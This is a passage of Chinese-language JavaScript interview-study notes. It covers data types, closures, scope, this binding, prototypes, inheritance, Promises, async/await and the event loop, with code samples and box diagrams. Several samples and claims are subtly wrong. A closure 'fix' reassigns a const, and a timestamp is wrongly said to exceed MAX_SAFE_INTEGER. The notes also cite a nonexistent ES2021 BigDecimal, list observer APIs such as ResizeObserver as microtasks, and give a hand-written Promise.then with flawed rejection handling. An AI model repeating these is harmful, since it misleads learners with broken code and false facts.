│  symbol             │    └─ regexp              │
│  bigint             │                            │
└─────────────────────┴────────────────────────────┘

判断方法：typeof
┌────────────────────────────────────────┐
│  typeof 123        → "number"          │
│  typeof "str"      → "string"          │
│  typeof true       → "boolean"         │
│  typeof undefined  → "undefined"       │
│  typeof null       → "object"  ← 历史bug│
│  typeof Symbol()   → "symbol"          │
│  typeof BigInt(1)  → "bigint"         │
│  typeof {}         → "object"          │
│  typeof []         → "object"          │
│  typeof function   → "function"        │
└────────────────────────────────────────┘
```

存储方式区别：

```javascript
// 基本类型：栈Stack，存值
let a = 1;
let b = a;    // b是副本
b = 2;
console.log(a); // 1，原值不变

// 引用类型：栈存指针，堆Heap存值
let obj1 = { name: "张三" };
let obj2 = obj1;    // obj2和obj1指向同一堆地址
obj2.name = "李四";
console.log(obj1.name); // "李四"，原对象被修改

// 内存模型：
// 栈（Stack）              堆（Heap）
// ┌─────────┐              ┌─────────────┐
// │ a: 1    │              │ {name:"李四"}│  ← obj1/obj2指向这里
// │ obj1──┼─┼──────→       └─────────────┘
// │ obj2──┼─┘                (同一个对象)
// └─────────┘
```

#### 1.2 null vs undefined

```javascript
// undefined：已声明但未赋值
let a;
console.log(a); // undefined

// null：主动赋值为"无"
let b = null;
console.log(b); // null

// 场景区别：
// 1. 函数参数未传
function fn(x) { console.log(x); }
fn();          // undefined

// 2. 对象属性不存在
let obj = {};
console.log(obj.name); // undefined

// 3. 函数没有返回值
function noReturn() {}
console.log(noReturn()); // undefined

// 4. 显式空值（通常用null）
let empty = null;  // 明确表示"这里没有值"
```

#### 1.3 typeof null 为什么是 "object"

这是 JavaScript 历史悠久的 bug，源于 JS 早期的类型系统：

```javascript
// 0在机器码中代表"全为零"，null的32位全0被错误地判断为对象
// 内部实现（简化）：
// if (value is 0x00000000) return "object";  // bug

// 正确判断null的方法：
console.log(null === null); // true
console.log(Object.prototype.toString.call(null)); // "[object Null]"
console.log(Array.isArray(null)); // false
```

---

### 2. 运算符与比较

#### 2.1 == vs ===

```javascript
// ==：宽松相等，隐式类型转换
console.log(1 == "1");      // true，字符串转数字
console.log(true == 1);     // true，boolean转数字
console.log(null == undefined); // true
console.log(0 == false);    // true

// ===：严格相等，不转换类型
console.log(1 === "1");     // false，类型不同
console.log(true === 1);    // false

// == 转换规则表：
// ┌─────────┬──────────────────────────────────┐
// │ 值       │ 转换后比较                         │
// ├─────────┼──────────────────────────────────┤
// │ null    │ 只和undefined相等                  │
// │ undefined│ 只和null相等                       │
// │ string  │ 和number比：转数字                  │
// │ boolean │ 转数字（true=1, false=0）          │
// │ object  │ toPrimitive转原始值后再比           │
// └─────────┴──────────────────────────────────┘

// 实际建议：始终使用 ===
```

#### 2.2 Object.is vs ===

```javascript
// Object.is 判断更精确
console.log(Object.is(NaN, NaN));       // true（=== 为 false）
console.log(Object.is(+0, -0));        // false（=== 为 true）
console.log(Object.is({}, {}));        // false（引用不同）

// Object.is 内部实现：
function is(x, y) {
  if (x === y) {
    // 区分 +0 和 -0
    return x !== 0 || 1 / x === 1 / y;
  }
  // 区分 NaN 和 非NaN
  return x !== x && y !== y; // 只有 NaN 满足 x !== x
}
```

---

### 3. 数据类型转换

#### 3.1 ToPrimitive 规则

ToPrimitive 是 JS 内部用于将对象转为原始值的算法：

```javascript
// ToPrimitive(obj, preferredType)
// 1. 如果是原始类型，直接返回
// 2. 调用 valueOf()，如果返回原始类型就返回
// 3. 调用 toString()，如果返回原始类型就返回
// 4. 抛出 TypeError

const obj = {
  valueOf() { return 42; },
  toString() { return "hello"; }
};
console.log(obj + 1); // 43，优先调用 valueOf

// [] + [] = ""：两边都转成字符串再拼接
// [] + {} = "[object Object]"：数组先转字符串
// {} + [] = 0：{}被当成语句，+[]转为0
```

#### 3.2 隐式转换规则

```javascript
// 加法：有一边是字符串就拼接，否则转数字
console.log(1 + "2");   // "12"
console.log(1 + 2);    // 3
console.log(true + 1); // 2

// 减/乘/除：转数字
console.log("5" - 2);  // 3
console.log("5" * 2);  // 10

// 比较：转数字或字符串
console.log("10" > 9); // true

// 逻辑运算：转boolean
console.log(!0);       // true
console.log(!"");      // true
console.log(!!null);   // false
```

---

### 4. Symbol 与 BigInt

#### 4.1 Symbol 作用

```javascript
// Symbol：创建唯一值
const s1 = Symbol("desc");
const s2 = Symbol("desc");
console.log(s1 === s2); // false

// 应用场景1：对象属性名（避免冲突）
const obj = {
  [Symbol.iterator]: function* () {},
  [Symbol.toStringTag]: "MyObj"
};

// 应用场景2：模拟私有属性（约定，非真正私有）
const _private = Symbol("private");
const user = {
  name: "张三",
  [_private]: "内部数据"  // 外部无法直接访问
};

// 应用场景3：消除魔法字符串
const STATUS = {
  PENDING: Symbol("pending"),
  FULFILLED: Symbol("fulfilled")
};

// 应用场景4：全局Symbol注册
const globalSym = Symbol.for("app.key"); // 全局唯一
const same = Symbol.for("app.key");
console.log(globalSym === same); // true

// 获取Symbol描述
console.log(s1.description); // "desc"
```

#### 4.2 BigInt

```javascript
// BigInt：处理大整数（number最大安全整数 2^53-1）
const big = 9007199254740993n;
console.log(big + 1n); // 9007199254740994n

// 不能和number混用运算
// big + 1; // 报错
big + BigInt(1); // OK

// 使用场景：时间戳（毫秒级）、ID计算、加密
const timestamp = 1715000000000n; // 超过Number.MAX_SAFE_INTEGER
```

#### 4.3 0.1 + 0.2 !== 0.3

```javascript
// 浮点数精度问题：IEEE 754二进制浮点
console.log(0.1 + 0.2); // 0.30000000000000004

// 原因：
// 0.1 → 0.000110011001100110...（二进制无限循环）
// 0.2 → 0.001100110011001100...（二进制无限循环）
// IEEE 754截断后产生微小误差

// 解决方案：
// 1. toFixed（注意返回字符串）
console.log((0.1 + 0.2).toFixed(2)); // "0.30"

// 2. 转为整数运算（推荐）
function add(a, b, precision = 2) {
  const p = Math.pow(10, precision);
  return (a * p + b * p) / p;
}
console.log(add(0.1, 0.2)); // 0.3

// 3. ES2021 BigDecimal 或 decimal.js 库
// import Decimal from 'decimal.js';
// new Decimal(0.1).plus(0.2).toNumber(); // 0.3

// 4. 使用epsilon比较
function isEqual(a, b, epsilon = 1e-10) {
  return Math.abs(a - b) < epsilon;
}
console.log(isEqual(0.1 + 0.2, 0.3)); // true
```

---

### 5. 闭包

#### 5.1 什么是闭包

```javascript
// 闭包：函数记住并访问其词法作用域之外的变量
function outer() {
  const x = 10;
  function inner() {
    console.log(x); // 访问outer的变量
  }
  return inner;
}
const fn = outer();
fn(); // 10

// 闭包形成图解：
// ┌─────────────────────────────────────────────┐
// │  outer() 执行上下文                           │
// │    x = 10                                    │
// │    inner函数定义（携带 [[Scope]] → outer AO） │
// │  outer返回inner，outer执行上下文关闭          │
// │    但inner的[[Scope]]仍引用outer的变量对象    │
// └─────────────────────────────────────────────┘
// ┌─────────────────────────────────────────────┐
// │  fn() 执行（inner）                          │
// │    通过[[Scope]]访问已关闭的outer.x = 10      │
// └─────────────────────────────────────────────┘
```

#### 5.2 为什么能访问外层变量

```javascript
// 每个函数在创建时记录其创建位置的词法作用域（[[Scope]]）
// 无论函数在哪里执行，都能通过[[Scope]]链访问外层变量

function makeAdder(x) {
  return function(y) { return x + y; };
}
const add5 = makeAdder(5);
const add10 = makeAdder(10);
console.log(add5(2));  // 7（访问x=5）
console.log(add10(2)); // 12（访问x=10）

// 即使makeAdder已返回，其执行上下文已出栈
// add5/add10的[[Scope]]仍持有对x的引用
```

#### 5.3 内存泄漏与闭包

```javascript
// 闭包导致内存泄漏的场景：
// 持有对大型对象或DOM节点的引用，但已不再需要

function leak() {
  const bigArray = new Array(1000000).fill("x");
  const handler = function() { return bigArray.length; };
  document.getElementById("btn").onclick = handler; // DOM引用
  // bigArray 无法被回收，因为 handler 引用它
}

// 解决：手动置空
function noLeak() {
  const bigArray = new Array(1000000).fill("x");
  const handler = function() { return bigArray.length; };
  document.getElementById("btn").onclick = handler;
  return function() { bigArray = null; }; // 解绑
}
```

#### 5.4 应用场景

```javascript
// 1. 数据私有/模块化
const counter = (function() {
  let count = 0;
  return {
    inc: () => ++count,
    dec: () => --count,
    get: () => count
  };
})();
counter.inc();
counter.inc();
console.log(counter.get()); // 2

// 2. 函数柯里化
function currying(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return function(...args2) {
      return curried.apply(this, args.concat(args2));
    };
  };
}

// 3. 防抖节流
function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

// 4. 缓存（记忆化）
function memo(fn) {
  const cache = {};
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache[key] !== undefined) return cache[key];
    return cache[key] = fn.apply(this, args);
  };
}
```

---

### 6. 作用域与作用域链

```javascript
// 作用域链：
// 函数创建时形成 [[Scope]] 链，运行时顺着这条链查找变量

var a = 1;
function f1() {
  var b = 2;
  function f2() {
    var c = 3;
    console.log(a, b, c); // 1, 2, 3
    // 查找路径：f2 → f1 → global（scope chain）
  }
  f2();
}
f1();

// 作用域链图解：
// ┌─────────────────────────────────────────┐
// │  Global Scope                            │
// │    a = 1                                 │
// │    f1 = function                         │
// │    └── f1[[Scope]] = [global]           │
// └────────────┬────────────────────────────┘
//              │ parent
//              ▼
// ┌─────────────────────────────────────────┐
// │  f1() Scope                             │
// │    b = 2                                │
// │    f2 = function                        │
// │    └── f2[[Scope]] = [f1, global]       │
// └────────────┬────────────────────────────┘
//              │ parent
//              ▼
// ┌─────────────────────────────────────────┐
// │  f2() Scope（当前）                      │
// │    c = 3                                │
// │    查找：本地→f1→global                 │
// └─────────────────────────────────────────┘

// var vs let/const 作用域：
// var：函数作用域，let/const：块级作用域
function test() {
  if (true) {
    var x = 10;    // 函数作用域
    let y = 20;    // 块级作用域
  }
  console.log(x); // 10（可见）
  console.log(y); // ReferenceError（块外不可见）
}
```

---

### 7. var / let / const

```javascript
// var特性：
// 1. 函数作用域（非块级）
// 2. 声明提升（值为undefined）
// 3. 可重复声明

// let特性：
// 1. 块级作用域
// 2. 暂时性死区（TDZ）
// 3. 不可重复声明

// const特性：
// 1. 块级作用域
// 2. 暂时性死区
// 3. 声明时必须初始化
// 4. 不能重新赋值（但引用类型内部可修改）

// 暂时性死区：
console.log(a); // undefined（var提升）
// console.log(b); // ReferenceError（TDZ）
let b = 1;

// var提升：
console.log(x); // undefined，var x在后但提升了
var x = 10;
// 等价于：
// var x; // 提升
// console.log(x);
// x = 10;

// 循环中的闭包问题：
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // 3,3,3
}
// 原因：var是函数作用域，i是共享的
// 解决1：let（每次迭代有独立副本）
for (let j = 0; j < 3; j++) {
  setTimeout(() => console.log(j), 100); // 0,1,2
}
// 解决2：IIFE
for (var k = 0; k < 3; k++) {
  (function(k) {
    setTimeout(() => console.log(k), 100);
  })(k);
}

// const对象内部可改：
const obj = { name: "张三" };
obj.name = "李四"; // OK
// obj = {}; // TypeError：不能重新赋值
```

---

### 8. this 指向

#### 8.1 this 指向规则

```javascript
// 规则1：普通函数调用（默认绑定）
function fn() { console.log(this); }
fn(); // 全局对象（严格模式下undefined）

// 规则2：对象方法调用（隐式绑定）
const obj = {
  name: "obj",
  say() { console.log(this.name); }
};
obj.say(); // "obj"（this指向obj）

// 规则3：call/apply/bind（显式绑定）
function greet(place) { console.log(`${this.name}来自${place}`); }
const p = { name: "张三" };
greet.call(p, "北京"); // this指向p

// 规则4：new调用（构造器绑定）
function Person(name) { this.name = name; }
const p2 = new Person("李四");
console.log(p2.name); // "李四"，this指向新对象

// 规则5：箭头函数（词法绑定，继承外层this）
const arrow = () => console.log(this);
const obj2 = {
  name: "obj2",
  say() {
    const inner = () => console.log(this.name);
    inner(); // this继承say的this，即obj2
  }
};
obj2.say(); // "obj2"

// this优先级：new > bind > call/apply > 对象调用 > 默认
```

#### 8.2 箭头函数为什么没有 this

```javascript
// 箭头函数没有自己的this，也没有arguments、super等
// 它在创建时就绑定了外层作用域的this，之后不可改变

function Timer() {
  this.time = 0;
  setInterval(() => {
    this.time++; // this继承Timer构造的实例
    console.log(this.time);
  }, 1000);
}
new Timer();

// 对比普通函数：
function Timer2() {
  this.time = 0;
  setInterval(function() {
    // 这里的this指向window（或undefined）
    // this.time++; // 报错
  }, 1000);
}

// 箭头函数vs普通函数区别：
// ┌─────────────┬──────────────────┬──────────────────┐
// │ 特性         │ 箭头函数          │ 普通函数          │
// ├─────────────┼──────────────────┼──────────────────┤
// │ this        │ 继承外层          │ 调用时决定        │
// │ arguments   │ 无（可用rest）    │ 有               │
// │ constructor │ 无，不能new       │ 有               │
// │ prototype   │ 无               │ 有               │
// │ super       │ 无               │ 有               │
// │ 简短写法    │ 支持隐式return    │ 不支持            │
// └─────────────┴──────────────────┴──────────────────┘
```

---

### 9. new 操作符原理

```javascript
// new Person("张三", 18) 做了什么：
// 1. 创建新对象 {}
// 2. 原型绑定：__proto__ = Person.prototype
// 3. this绑定：执行构造函数，this指向新对象
// 4. 返回值：如果构造函数返回对象则用返回值，否则返回新对象

function _new(Constructor, ...args) {
  // 1. 创建新对象，绑定原型
  const obj = Object.create(Constructor.prototype);
  // 2. 调用构造函数，绑定this
  const result = Constructor.apply(obj, args);
  // 3. 返回：如果返回值是对象/函数就返回它，否则返回新对象
  return result instanceof Object ? result : obj;
}

// 验证：
function Person(name, age) {
  this.name = name;
  this.age = age;
}
Person.prototype.greet = function() {
  return `我是${this.name}，${this.age}岁`;
};

const p = _new(Person, "张三", 18);
console.log(p.name);  // 张三
console.log(p.greet()); // 我是张三，18岁
console.log(p instanceof Person); // true

// 手动实现new：
function myNew(Ctor, ...args) {
  if (typeof Ctor !== 'function') throw new TypeError('not a function');
  const target = Object.create(Ctor.prototype);
  const result = Ctor.apply(target, args);
  return result !== null && typeof result === 'object' ? result : target;
}
```

---

### 10. call / apply / bind

```javascript
// call：调用函数，this指向第一个参数，其余参数逐个传递
function say(greeting, punct) {
  console.log(`${greeting}, I'm ${this.name}${punct}`);
}
say.call({ name: "张三" }, "你好", "！"); // 你好, I'm 张三！

// apply：调用函数，this指向第一个参数，其余参数用数组
say.apply({ name: "李四" }, ["您好", "。"]); // 您好, I'm 李四。

// bind：返回新函数，this永久绑定到第一个参数
const bound = say.bind({ name: "王五" });
bound("hello", "?"); // hello, I'm 王五?
// 后续call/apply无法覆盖bind绑定的this
bound.call({ name: "无效" }, "hi", "!"); // hello, I'm 王五!

// 手写call：
Function.prototype.myCall = function(context = window, ...args) {
  if (context === null || context === undefined) context = window;
  // 避免key冲突，用Symbol
  const fn = Symbol('fn');
  // 把当前函数（this）挂到context上
  context[fn] = this;
  // 调用它
  const result = context[fn](...args);
  // 清理
  delete context[fn];
  return result;
};

// 手写apply（类似call，只是参数格式不同）：
Function.prototype.myApply = function(context = window, args = []) {
  if (context === null || context === undefined) context = window;
  const fn = Symbol('fn');
  context[fn] = this;
  const result = context[fn](...args);
  delete context[fn];
  return result;
};

// 手写bind（返回新函数）：
Function.prototype.myBind = function(context = window, ...bindArgs) {
  const originalFn = this;
  function boundFn(...callArgs) {
    // new调用时，this指向实例，忽略context
    const isNew = this instanceof originalFn;
    const finalThis = isNew ? this : (context || window);
    return originalFn.apply(finalThis, [...bindArgs, ...callArgs]);
  }
  // 继承原型属性
  function Empty() {}
  Empty.prototype = originalFn.prototype;
  boundFn.prototype = new Empty();
  return boundFn;
};
```

---

### 11. 原型与原型链

#### 11.1 prototype vs __proto__

```javascript
// prototype：函数独有的属性，指向原型对象（用于new时继承）
// __proto__：对象都有，指向其构造函数的prototype

function Person(name) { this.name = name; }
Person.prototype.sayHi = function() { return `你好，我是${this.name}`; };

const p = new Person("张三");
console.log(p.__proto__ === Person.prototype); // true
console.log(Person.prototype.constructor === Person); // true

// 关系图：
// ┌─────────────────────────────────────────┐
// │  Person.prototype（原型对象）            │
// │    constructor → Person（回指）          │
// │    sayHi → function                    │
// │    __proto__ → Object.prototype         │
// └─────────────────────────────────────────┘
//              ▲
//              │ __proto__
//              │
// ┌─────────────────────────────────────────┐
// │  p（实例）                               │
// │    name = "张三"                         │
// │    __proto__ → Person.prototype         │
// └─────────────────────────────────────────┘
```

#### 11.2 原型链

```javascript
// 原型链：实例 → 构造函数.prototype → Object.prototype → null
// 查找属性时，顺着原型链向上找，直到null

const obj = { name: "obj" };
// obj → Object.prototype → null

function Parent() { this.parent = "parent"; }
function Child() { this.child = "child"; }
Child.prototype = new Parent(); // 原型链继承
Child.prototype.constructor = Child;

const c = new Child();
console.log(c.child);   // "child"
console.log(c.parent);  // "parent"（沿原型链找到）

// 原型链图解：
// c实例
//   └── __proto__ → Child.prototype（new Parent()）
//                    └── __proto__ → Parent.prototype
//                                      └── __proto__ → Object.prototype
//                                                              └── __proto__ → null

// 顺原型链查找属性：
console.log(c.hasOwnProperty('child'));   // true
console.log(c.hasOwnProperty('parent'));  // false（在原型上）
console.log('parent' in c);               // true（in会查找整条链）
```

---

### 12. JS 继承实现

#### 12.1 原型链继承

```javascript
// 原型链继承：子类的原型指向父类实例
function Parent() { this.colors = ["红", "蓝"]; }
Parent.prototype.say = function() { console.log("Parent.say"); };

function Child() {}
Child.prototype = new Parent();
Child.prototype.constructor = Child;

const c1 = new Child();
c1.colors.push("绿");
console.log(c1.colors); // ["红","蓝","绿"]
const c2 = new Child();
console.log(c2.colors); // ["红","蓝","绿"]（引用共享，问题！）

// 优点：简单，方法可复用
// 缺点：引用类型被共享，无法向父类传参
```

#### 12.2 构造函数继承（借用构造函数）

```javascript
// 借用构造函数：在子类中调用父类构造函数
function Parent(name) { this.name = name; this.colors = ["红"]; }
function Child(name, age) {
  Parent.call(this, name); // 复制父类属性到子类实例
  this.age = age;
}

const c1 = new Child("张三", 18);
c1.colors.push("蓝");
console.log(c1.colors); // ["红","蓝"]
const c2 = new Child("李四", 20);
console.log(c2.colors); // ["红"]（独立，不共享！）

// 优点：引用类型独立，可传参
// 缺点：方法不能复用（每个实例都有方法副本），需要调用两次构造函数
```

#### 12.3 组合继承

```javascript
// 组合继承：原型链 + 构造函数
function Parent(name) { this.name = name; this.colors = ["红"]; }
Parent.prototype.say = function() { console.log(this.name); };

function Child(name, age) {
  Parent.call(this, name); // 借用构造函数：继承实例属性
  this.age = age;
}
Child.prototype = new Parent(); // 原型链：继承方法
Child.prototype.constructor = Child;
Child.prototype.study = function() { console.log("学习"); };

// 测试
const c = new Child("张三", 18);
c.colors.push("蓝");
console.log(c.colors); // ["红","蓝"]
c.say(); // 张三
c.study(); // 学习

// 优点：弥补了原型链和构造函数继承的缺点
// 缺点：调用了两次父类构造函数（call + new）
```

#### 12.4 寄生继承

```javascript
// 寄生继承：组合继承的优化，避免调用两次构造函数
function Parent(name) { this.name = name; }
Parent.prototype.say = function() { console.log(this.name); };

function Child(name, age) {
  Parent.call(this, name); // 借用构造函数
  this.age = age;
}

// 用Object.create代替new Parent()，只继承方法，不继承实例属性
Child.prototype = Object.create(Parent.prototype);
Child.prototype.constructor = Child;

// Object.create内部：
// {}.__proto__ = Parent.prototype（只复制了方法，没有实例属性）

// 优化：只需继承prototype上的方法，Parent的实例属性已经在call中复制了
```

#### 12.5 ES6 class 继承

```javascript
class Animal {
  constructor(name) { this.name = name; }
  speak() { console.log(`${this.name}叫`); }
  static info() { return "动物类"; }
}

class Dog extends Animal {
  constructor(name, breed) {
    super(name); // 必须在this之前调用
    this.breed = breed;
  }
  speak() { console.log(`${this.name}汪汪`); }
  run() { console.log(`${this.name}奔跑`); }
}

const d = new Dog("旺财", "金毛");
d.speak(); // 旺财汪汪（子类覆盖）
d.run();   // 旺财奔跑
console.log(d instanceof Dog);   // true
console.log(d instanceof Animal); // true（顺着原型链）

// class本质：
// class = 构造函数 + 原型方法 的语法糖
// class Dog {} 等价于 function Dog() {}
// Dog.prototype = Object.create(Animal.prototype)
// Dog.prototype.constructor = Dog

// super原理：
// super() = Animal.call(this, name)
// 调用父类构造函数，将子类实例作为this
// super.method() = Animal.prototype.method.call(this)
// 调用父类方法，绑定子类的this

// 静态方法继承：
class Cat extends Animal {}
console.log(Cat.info()); // 动物类（静态方法也被继承了）
```

---

### 13. Promise

#### 13.1 Promise 原理

```javascript
// Promise三种状态：
// pending（进行中）→ fulfilled（已成功）或 rejected（已失败）
// 状态一旦改变就不可逆

// 简化实现：
class MyPromise {
  constructor(executor) {
    this.state = 'pending';
    this.value = undefined;
    this.callbacks = [];

    const resolve = (value) => {
      if (this.state !== 'pending') return;
      this.state = 'fulfilled';
      this.value = value;
      // 处理异步onFulfilled
      this.callbacks.forEach(cb => cb.onFulfilled(value));
    };

    const reject = (reason) => {
      if (this.state !== 'pending') return;
      this.state = 'rejected';
      this.value = reason;
      this.callbacks.forEach(cb => cb.onRejected(reason));
    };

    try { executor(resolve, reject); }
    catch (e) { reject(e); }
  }

  then(onFulfilled, onRejected) {
    // 返回新的Promise以支持链式调用
    return new MyPromise((resolve, reject) => {
      const handle = (callback, fallback) => {
        try {
          const fn = typeof callback === 'function' ? callback : fallback;
          // 使用 queueMicrotask 确保微任务
          queueMicrotask(() => {
            if (this.state === 'fulfilled') {
              try { resolve(fn(this.value)); }
              catch (e) { reject(e); }
            } else if (this.state === 'rejected') {
              try { reject(fn(this.value)); }
              catch (e) { reject(e); }
            } else {
              // pending：注册回调
              this.callbacks.push({
                onFulfilled: (v) => handle(onFulfilled, v => v),
                onRejected: (v) => handle(onRejected, e => { throw e; })
              });
            }
          });
        } catch (e) { reject(e); }
      };
      handle(onFulfilled, v => v);
    });
  }

  catch(onRejected) { return this.then(null, onRejected); }
  finally(fn) { return this.then(fn, fn); }
}

// Promise.then 返回值规则：
// ┌───────────────────────┬──────────────────────────┐
// │ then返回值             │ 下一个Promise              │
// ├───────────────────────┼──────────────────────────┤
// │ 普通值                 │ resolved(该值)            │
// │ Promise               │ 采用该Promise的最终状态     │
// │ throw错误             │ rejected(错误)            │
// │ thenable对象          │ resolved(thenable.then)  │
// └───────────────────────┴──────────────────────────┘

// Promise链式调用原理：
new Promise(r => r(1))
  .then(x => x + 1)     // p1 resolved为2
  .then(x => x * 2)     // p2 resolved为4
  .then(console.log)    // 打印4

// thenable：拥有then方法的对象，会被Promise采用
const thenable = {
  then(resolve, reject) { resolve(42); }
};
Promise.resolve(thenable).then(x => console.log(x)); // 42

// Promise.resolve做了什么：
// 1. 已经是Promise，直接返回
// 2. 有then方法的对象（thenable），包装后返回
// 3. 其他值：resolved Promise
// Promise.reject：永远是rejected
```

#### 13.2 async / await 原理

```javascript
// async函数返回Promise
async function fn() { return 1; }
// 等价于：
function fn() { return Promise.resolve(1); }

// await：等待Promise resolve，暂停async函数执行
async function main() {
  const r1 = await fetchData(); // 等待Promise完成
  const r2 = await process(r1); // 等上一个完成再执行
  return r2;
}

// async是generator的语法糖：
// async function* gen() {} = generator + auto runner

// 手写async实现：
function asyncToGenerator(generatorFn) {
  return function(...args) {
    const gen = generatorFn.apply(this, args);
    return new Promise((resolve, reject) => {
      function step(key, value) {
        let result;
        try {
          result = gen[key](value); // gen.next() 或 gen.throw()
        } catch (e) { return reject(e); }
        const { value: val, done } = result;
        if (done) {
          resolve(val); // generator完成
        } else {
          // Promise化：如果value是Promise，继续then；否则直接next
          Promise.resolve(val).then(
            v => step('next', v),
            e => step('throw', e)
          );
        }
      }
      step('next');
    });
  };
}

// 示例：
function* gen() {
  const a = yield Promise.resolve(1);
  const b = yield Promise.resolve(a + 2);
  return b;
}
// 手动执行：
const g = gen();
g.next().value.then(v => g.next(v).value.then(w => g.next(w)));
// 自动执行（co函数）：
function co(gen) {
  return new Promise((resolve, reject) => {
    if (typeof gen === 'function') gen = gen();
    if (!gen || typeof gen.next !== 'function') return resolve(gen);
    onFulfilled();
    function onFulfilled(val) {
      let result;
      try { result = gen.next(val); }
      catch (e) { return reject(e); }
      if (result.done) return resolve(result.value);
      Promise.resolve(result.value).then(onFulfilled, onThrow);
    }
    function onThrow(err) {
      let result;
      try { result = gen.throw(err); }
      catch (e) { return reject(e); }
      if (result.done) return resolve(result.value);
      Promise.resolve(result.value).then(onFulfilled, onThrow);
    }
  });
}
co(gen).then(v => console.log(v)); // 3

// Generator原理：
// Generator函数调用时不执行，返回一个迭代器
// 每次调用iterator.next()执行到下一个yield，暂停
// next(val)可向yield传值（替换yield表达式的值）
// throw()向当前yield位置抛异常
// return()提前结束generator

function* counter() {
  let n = 0;
  while (true) {
    const input = yield ++n; // yield暂停，返回n+1，下次next(input)给input
    if (input === 'reset') n = 0;
  }
}
const it = counter();
console.log(it.next().value);     // 1
console.log(it.next().value);     // 2
console.log(it.next('reset').value); // 1（reset后n被设为0，yield返回++n=1）
```

#### 13.3 Promise.all / race / allSettled / any

```javascript
// Promise.all：全部成功才成功，一个失败就reject
// 返回值顺序由输入顺序决定（即使完成顺序不同）
const p1 = Promise.resolve(1);
const p2 = new Promise(r => setTimeout(() => r(2), 100));
const p3 = Promise.resolve(3);
Promise.all([p1, p2, p3]).then(console.log); // [1, 2, 3]

// Promise.all 实现：
function promiseAll(promises) {
  return new Promise((resolve, reject) => {
    const results = new Array(promises.length);
    let settled = 0;
    promises.forEach((p, i) => {
      Promise.resolve(p).then(
        v => { results[i] = v; if (++settled === promises.length) resolve(results); },
        e => reject(e) // 有一个失败就reject
      );
    });
    if (promises.length === 0) resolve([]);
  });
}

// Promise.race：返回最先settle（成功或失败）的Promise
Promise.race([
  new Promise(r => setTimeout(() => r(1), 300)),
  new Promise((_, r) => setTimeout(() => r(2), 100)),
  new Promise(r => setTimeout(() => r(3), 200))
]).then(console.log, console.error); // 2（第二个先失败）

// Promise.allSettled：等待所有Promise settled，返回每个的结果
// ES2020，不会因为失败而reject
Promise.allSettled([
  Promise.resolve(1),
  Promise.reject("error"),
  Promise.resolve(3)
]).then(results => results.forEach(r => {
  if (r.status === 'fulfilled') console.log(r.value);
  else console.error(r.reason);
}));
// [{status:'fulfilled',value:1},{status:'rejected',reason:'error'},...]

// Promise.any：返回第一个fulfilled的Promise，全部失败才reject（AggregateError）
Promise.any([
  Promise.reject("err1"),
  Promise.reject("err2"),
  Promise.resolve(1)
]).then(console.log); // 1
```

---

### 14. 事件循环（Event Loop）

#### 14.1 宏任务 vs 微任务

```javascript
// 事件循环顺序：
// 1. 执行同步代码（宏任务）
// 2. 执行所有微任务（Promise.then, MutationObserver, queueMicrotask）
// 3. 执行一个宏任务（setTimeout, setInterval, I/O, UI rendering）
// 4. 循环微任务
// 5. 执行下一个宏任务
// ...

console.log('1');
setTimeout(() => console.log('2'), 0);
Promise.resolve().then(() => console.log('3'));
Promise.resolve().then(() => console.log('4'));
console.log('5');
// 输出：1, 5, 3, 4, 2

// 微任务列表：
// - Promise.then/.catch/.finally
// - queueMicrotask()
// - MutationObserver（DOM变化观察）
// - IntersectionObserver（进入视口）
// - ResizeObserver
// - PerformanceObserver

// 宏任务列表：
// - setTimeout / setInterval
// - I/O操作（文件读写、网络请求）
// - UI渲染
// - requestAnimationFrame
// - requestIdleCallback
// - setImmediate（Node.js）
// - 事件回调

// 为什么Promise是微任务？
// Promise设计者选择了微任务队列（microtask queue）而非宏任务队列
// 这样Promise的then回调能在当前同步代码完成后尽快执行
// 而setTimeout会等下一个宏任务，有额外延迟
```

#### 14.2 浏览器 Event Loop 流程

```javascript
// 浏览器Event Loop完整流程：
/*
   ┌─────────────────────────────────────────────────────┐
   │  1. 执行同步代码（call stack）                        │
   │     ↓                                              │
   │  2. 清空微任务队列（microtask queue）                 │
   │     ├── Promise.then                               │
   │     ├── queueMicrotask                             │
   │     └── MutationObserver                          │
   │     循环直到队列空                                   │
   │     ↓                                              │
   │  3. 执行一个宏任务（macrotask queue）                 │
   │     ├── setTimeout callback                        │
   │     ├── setInterval callback                       │
   │     ├── I/O callback                               │
   │     └── UI render（每帧一次）                        │
   │     ↓                                              │
   │  4. 重复2-3（微任务 → 宏任务 → 微任务...）            │
   └─────────────────────────────────────────────────────┘

   示例分析：
*/
console.log('A');
setTimeout(() => console.log('B'), 0);
new Promise(resolve => {
  console.log('C');
  resolve();
}).then(() => console.log('D'));
queueMicrotask(() => console.log('E'));
console.log('F');
// 输出：A, C, F, D, E, B
// 分析：
// 同步：A,C,F
// 微任务：D,E
// 宏任务：B

// async/await 中的微任务：
async function test() {
  console.log('A');
  await Promise.resolve();
  console.log('B');
}
console.log('C');
test();
console.log('D');
// 输出：C, A, D, B
// 分析：
// 同步：C, A（async函数体同步部分执行到await）
// await Promise.resolve() 产生微任务
// D（同步）
// 微任务：打印B
```

#### 14.3 浏览器 vs Node Event Loop

```javascript
// Node.js Event Loop（libuv）：
// ┌────────────────────────────┐
// │  timers（setTimeout/interval）│
// │  pending callbacks          │
// │  idle, prepare              │
// │  poll（获取新I/O事件）       │
// │  check（setImmediate）      │
// │  close callbacks            │
// └────────────────────────────┘
//
// Node特点：
// 1. setImmediate 在 I/O 回调之后、check阶段执行
// 2. process.nextTick 在当前阶段结束后、下个阶段前执行（优先级高于微任务）
// 3. 微任务：Promise.then + process.nextTick

// setTimeout vs setImmediate：
setTimeout(() => console.log('timeout'));
setImmediate(() => console.log('immediate'));
// 在主脚本中：顺序不确定（取决于性能）
// 在I/O回调中：immediate 先于 timeout

// process.nextTick 优先级高于微任务：
process.nextTick(() => console.log('nextTick'));
Promise.resolve().then(() => console.log('microtask'));
// 输出：nextTick, microtask

// 微任务队列对比：
// 浏览器：Promise.then（微任务）
// Node：  Promise.then + process.nextTick（nextTick更快）

// Node中多个阶段的微任务：
// 每个阶段之间都会执行微任务队列（类似浏览器每轮宏任务后清微任务）
```

#### 14.4 MutationObserver 为什么是微任务

```javascript
// MutationObserver 回调是微任务，在当前同步代码结束后立即执行
